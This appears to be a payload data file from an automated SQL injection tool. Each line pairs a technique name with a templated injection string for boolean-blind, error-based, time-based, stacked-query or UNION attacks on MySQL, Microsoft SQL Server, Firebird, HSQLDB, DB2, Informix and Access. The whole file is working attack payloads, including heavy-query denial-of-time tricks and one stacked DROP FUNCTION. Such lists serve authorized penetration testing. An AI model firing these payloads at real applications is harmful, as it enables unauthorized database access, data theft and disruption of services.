AND boolean-based blind - WHERE or HAVING clause:::AND [RANDNUM]=[RANDNUM]
AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment):::AND [RANDNUM]=[RANDNUM]
AND boolean-based blind - WHERE or HAVING clause (MySQL comment):::AND [RANDNUM]=[RANDNUM]
AND boolean-based blind - WHERE or HAVING clause (comment):::AND [RANDNUM]=[RANDNUM]
AND boolean-based blind - WHERE or HAVING clause (subquery - comment):::AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
Boolean-based blind - Parameter replace (CASE - original value):::(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)
Boolean-based blind - Parameter replace (CASE):::(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)
Boolean-based blind - Parameter replace (DUAL - original value):::(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)
Boolean-based blind - Parameter replace (DUAL):::(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)
Boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
Firebird >= 2.0 AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Firebird >= 2.0 AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Firebird >= 2.0 OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Firebird >= 2.0 OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Firebird AND error-based - WHERE or HAVING clause:::AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')
Firebird OR error-based - WHERE or HAVING clause:::OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')
Firebird error-based - ORDER BY clause:::,(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))
Firebird error-based - Parameter replace:::(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))
Firebird inline queries:::SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE
Firebird stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4
Firebird stacked queries (heavy query):::;SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4
Firebird time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Generic UNION query (NULL) - 1 to 10 columns:::None
Generic UNION query (NULL) - 11 to 20 columns:::None
Generic UNION query (NULL) - 21 to 30 columns:::None
Generic UNION query (NULL) - 31 to 40 columns:::None
Generic UNION query (NULL) - 41 to 50 columns:::None
Generic UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom):::None
Generic UNION query ([CHAR]) - 1 to 10 columns:::None
Generic UNION query ([CHAR]) - 11 to 20 columns:::None
Generic UNION query ([CHAR]) - 21 to 30 columns:::None
Generic UNION query ([CHAR]) - 31 to 40 columns:::None
Generic UNION query ([CHAR]) - 41 to 50 columns:::None
Generic UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom):::None
Generic UNION query ([RANDNUM]) - 1 to 10 columns:::None
Generic UNION query ([RANDNUM]) - 11 to 20 columns:::None
Generic UNION query ([RANDNUM]) - 21 to 30 columns:::None
Generic UNION query ([RANDNUM]) - 31 to 40 columns:::None
Generic UNION query ([RANDNUM]) - 41 to 50 columns:::None
Generic UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom):::None
HAVING boolean-based blind - WHERE, GROUP BY clause:::HAVING [RANDNUM]=[RANDNUM]
HSQLDB > 2.0 AND time-based blind (heavy query - comment):::AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB > 2.0 AND time-based blind (heavy query):::AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB > 2.0 OR time-based blind (heavy query - comment):::OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB > 2.0 OR time-based blind (heavy query):::OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
HSQLDB > 2.0 time-based blind - Parameter replace (heavy query):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))
HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment):::AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)
HSQLDB >= 1.7.2 AND time-based blind (heavy query):::AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)
HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment):::OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)
HSQLDB >= 1.7.2 OR time-based blind (heavy query):::OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)
HSQLDB >= 1.7.2 stacked queries (heavy query - comment):::;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)
HSQLDB >= 1.7.2 stacked queries (heavy query):::;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)
HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
HSQLDB >= 2.0 stacked queries (heavy query - comment):::;CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB >= 2.0 stacked queries (heavy query):::;CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
IBM DB2 AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
IBM DB2 AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
IBM DB2 OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
IBM DB2 OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
IBM DB2 stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3
IBM DB2 stacked queries (heavy query):::;SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3
IBM DB2 time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
Informix AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Informix AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Informix OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Informix OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Informix boolean-based blind - Parameter replace:::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)
Informix boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)
Informix time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause:::,IIF([RANDNUM]=[RANDNUM],1,1/0)
Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value):::,IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)
Microsoft Access boolean-based blind - Parameter replace:::IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)
Microsoft Access boolean-based blind - Parameter replace (original value):::IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)
Microsoft Access boolean-based blind - Stacked queries:::;IIF([RANDNUM]=[RANDNUM],1,1/0)
Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT):::AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')
Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT):::AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN):::AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
Microsoft SQL Server/Sybase AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT):::OR [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')
Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT):::OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN):::OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
Microsoft SQL Server/Sybase OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase boolean-based blind - Parameter replace:::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)
Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF):::;IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]
Microsoft SQL Server/Sybase error-based - ORDER BY clause:::,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))
Microsoft SQL Server/Sybase error-based - Parameter replace:::(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))
Microsoft SQL Server/Sybase error-based - Parameter replace (integer column):::(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')
Microsoft SQL Server/Sybase inline queries:::(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')
Microsoft SQL Server/Sybase stacked queries:::;WAITFOR DELAY '0:0:[SLEEPTIME]'
Microsoft SQL Server/Sybase stacked queries (comment):::;WAITFOR DELAY '0:0:[SLEEPTIME]'
Microsoft SQL Server/Sybase time-based blind (IF - comment):::WAITFOR DELAY '0:0:[SLEEPTIME]'
Microsoft SQL Server/Sybase time-based blind (IF):::WAITFOR DELAY '0:0:[SLEEPTIME]'
Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))
MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
MySQL < 5.0 boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)
MySQL < 5.0.12 stacked queries (heavy query - comment):::;SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL < 5.0.12 stacked queries (heavy query):::;SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 AND time-based blind (heavy query - comment):::AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 AND time-based blind (heavy query):::AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 OR time-based blind (heavy query - comment):::OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 OR time-based blind (heavy query):::OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))
MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries):::(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM])
MySQL > 5.0.11 stacked queries:::;SELECT SLEEP([SLEEPTIME])
MySQL > 5.0.11 stacked queries (comment):::;SELECT SLEEP([SLEEPTIME])
MySQL > 5.0.11 stacked queries (query SLEEP - comment):::;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL > 5.0.11 stacked queries (query SLEEP):::;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR):::AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR):::OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR):::,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)
MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR):::AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR):::OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
MySQL >= 5.0 boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)
MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR):::,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
MySQL >= 5.0 error-based - Parameter replace (FLOOR):::(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
MySQL >= 5.0.12 AND time-based blind:::AND SLEEP([SLEEPTIME])
MySQL >= 5.0.12 AND time-based blind (comment):::AND SLEEP([SLEEPTIME])
MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment):::AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 AND time-based blind (query SLEEP):::AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 OR time-based blind:::OR SLEEP([SLEEPTIME])
MySQL >= 5.0.12 OR time-based blind (comment):::OR SLEEP([SLEEPTIME])
MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment):::OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 OR time-based blind (query SLEEP):::OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 RLIKE time-based blind:::RLIKE SLEEP([SLEEPTIME])
MySQL >= 5.0.12 RLIKE time-based blind (comment):::RLIKE SLEEP([SLEEPTIME])
MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment):::RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP):::RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END))
MySQL >= 5.0.12 time-based blind - Parameter replace:::(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)
MySQL >= 5.0.12 time-based blind - Parameter replace (substraction):::(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE):::AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML):::AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE):::OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML):::OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE):::,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML):::,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE):::PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)
MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE):::(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))
MySQL >= 5.1 error-based - Parameter replace (UPDATEXML):::(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))
MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE):::PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)
MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE):::PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)
MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED):::AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
